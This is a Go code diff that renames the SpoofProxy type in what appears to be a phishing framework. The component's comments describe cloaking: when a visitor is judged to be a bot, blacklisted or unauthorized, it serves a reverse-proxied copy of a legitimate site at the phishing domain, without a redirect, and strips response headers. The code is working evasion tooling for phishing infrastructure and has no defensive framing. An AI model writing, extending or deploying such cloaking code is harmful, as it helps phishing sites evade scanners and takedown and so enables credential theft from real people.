@@ -6,31 +6,31 @@ import (
 	"net/url"
 )
 
-// ProxySpoofProxy transparently reverse-proxies a configured legitimate website.
+// SpoofProxy transparently reverse-proxies a configured legitimate website.
 // Used when a connection is classified as bot, blacklisted, or unauthorized.
 // The visitor sees the spoofed site's content at the phishing domain with no redirect.
-type ProxySpoofProxy struct {
+type SpoofProxy struct {
 	defaultTarget *url.URL
 	rp            *httputil.ReverseProxy
 }
 
-// NewProxySpoofProxy constructs a ProxySpoofProxy using defaultSpoofURL as the fallback.
+// NewSpoofProxy constructs a SpoofProxy using defaultSpoofURL as the fallback.
 // If defaultSpoofURL is empty, requests are answered with a plain 200 OK.
-func NewProxySpoofProxy(defaultSpoofURL string) *ProxySpoofProxy {
+func NewSpoofProxy(defaultSpoofURL string) *SpoofProxy {
 	if defaultSpoofURL == "" {
-		return &ProxySpoofProxy{}
+		return &SpoofProxy{}
 	}
 	target, err := url.Parse(defaultSpoofURL)
 	if err != nil {
-		return &ProxySpoofProxy{}
+		return &SpoofProxy{}
 	}
 	rp := httputil.NewSingleHostReverseProxy(target)
 	rp.ModifyResponse = stripSpoofResponseHeaders
-	return &ProxySpoofProxy{defaultTarget: target, rp: rp}
+	return &SpoofProxy{defaultTarget: target, rp: rp}
 }
 
 // ServeHTTP serves the spoof response using the default configured target.
-func (s *ProxySpoofProxy) ServeHTTP(w http.ResponseWriter, r *http.Request) {
+func (s *SpoofProxy) ServeHTTP(w http.ResponseWriter, r *http.Request) {
 	if s.rp == nil {
 		w.WriteHeader(http.StatusOK)
 		return
@@ -39,7 +39,7 @@ func (s *ProxySpoofProxy) ServeHTTP(w http.ResponseWriter, r *http.Request) {
 }
 
 // ServeWithTarget uses a specific spoof URL rather than the configured default.
-func (s *ProxySpoofProxy) ServeWithTarget(w http.ResponseWriter, r *http.Request, spoofURL string) {
+func (s *SpoofProxy) ServeWithTarget(w http.ResponseWriter, r *http.Request, spoofURL string) {
 	target, err := url.Parse(spoofURL)
 	if err != nil {
 		s.ServeHTTP(w, r)
@@ -59,5 +59,5 @@ func stripSpoofResponseHeaders(resp *http.Response) error {
 	return nil
 }
 
-// Compile-time check: ProxySpoofProxy satisfies Spoofer.
-var _ Spoofer = (*ProxySpoofProxy)(nil)
+// Compile-time check: SpoofProxy satisfies Spoofer.
+var _ Spoofer = (*SpoofProxy)(nil)
